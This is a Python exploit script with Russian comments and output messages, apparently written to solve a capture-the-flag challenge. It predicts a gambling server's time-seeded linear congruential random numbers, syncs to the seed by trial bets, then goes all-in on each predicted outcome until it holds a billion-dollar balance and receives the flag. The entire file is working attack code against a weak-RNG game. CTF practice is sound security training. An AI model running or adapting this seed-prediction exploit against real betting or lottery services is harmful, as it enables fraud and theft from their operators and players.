import requests
import time
import sys

BASE_URL = "http://16.16.128.251:63417"
TARGET_BALANCE = 1000000000


# --- LCG генератор ---
def get_next_seed(seed):
    return (1103515245 * seed + 12345) % (2 ** 31)


def get_guess_from_seed(seed):
    return (seed % 10) + 1


# --------------------

def run_exploit():
    print("[+] Пытаюсь синхронизировать время...")
    base_seed = int(time.time())

    try:
        r = requests.get(f"{BASE_URL}/generate_token")
        token_text = r.text
        token = token_text.split('is: ')[1].split('\n')[0]
    except requests.exceptions.RequestException as e:
        print(f"[X] Не могу подключиться к серверу: {e}")
        sys.exit(1)

    print(f"[+] Получен токен: {token}")
    print(f"[+] Локальный base_seed: {base_seed}. Тестирую...")

    synced_seed_state = 0
    current_balance = 1000
    headers = {'Authorization': token, 'Content-Type': 'application/json'}

    # --- Шаг 1: Синхронизация ---
    for offset in [-1, 0, 1]:
        test_seed = base_seed + offset

        first_seed_state = get_next_seed(test_seed)
        predicted_guess = get_guess_from_seed(first_seed_state)

        print(f"[?] Тестирую seed: {test_seed} (предсказание: {predicted_guess})...")

        try:
            r = requests.post(f"{BASE_URL}/play", headers=headers, json={"bet": 1, "guess": predicted_guess})
            result = r.json()
        except requests.exceptions.RequestException as e:
            print(f"[X] Ошибка во время игры: {e}")
            continue

        if result.get("win"):
            print(f"[!!!] СИНХРОНИЗИРОВАНО! Правильный seed: {test_seed}")
            print(f"[+] Сервер выбросил {result.get('randomNumber')}, мы выиграли!")
            synced_seed_state = first_seed_state
            current_balance = 1001  # 1000 + 1 (выигрыш)
            break
        else:
            print(f"[-] ...неудача для {test_seed}. Сервер: {result.get('randomNumber')}")

    if synced_seed_state == 0:
        print("[X] Не удалось синхронизировать seed. Попробуй запустить скрипт еще раз.")
        return

    # --- Шаг 2: All-in ---
    current_seed = synced_seed_state

    while current_balance < TARGET_BALANCE:
        current_seed = get_next_seed(current_seed)
        guess = get_guess_from_seed(current_seed)
        bet = current_balance

        print(f"[+] Баланс: ${current_balance}. Ставлю ${bet} на {guess}...")

        try:
            r = requests.post(f"{BASE_URL}/play", headers=headers, json={"bet": bet, "guess": guess})
            result = r.json()
        except Exception as e:
            print(f"[X] Ошибка: {e}")
            time.sleep(1)
            continue

        if result.get("win"):
            current_balance += bet
            print(f"[+] ВЫИГРЫШ! Сервер: {result.get('randomNumber')}. Новый баланс: ${current_balance}")
            if result.get("flag"):
                print("\n[🏆🏆🏆] ЦЕЛЬ ДОСТИГНУТА! [🏆🏆🏆]")
                print(f"[+] Флаг: {result.get('flag')}")
                return
        else:
            print(f"[X] КРИТИЧЕСКАЯ ОШИБКА! Предсказание {guess} неверно, сервер: {result.get('randomNumber')}")
            return


if __name__ == "__main__":
    run_exploit()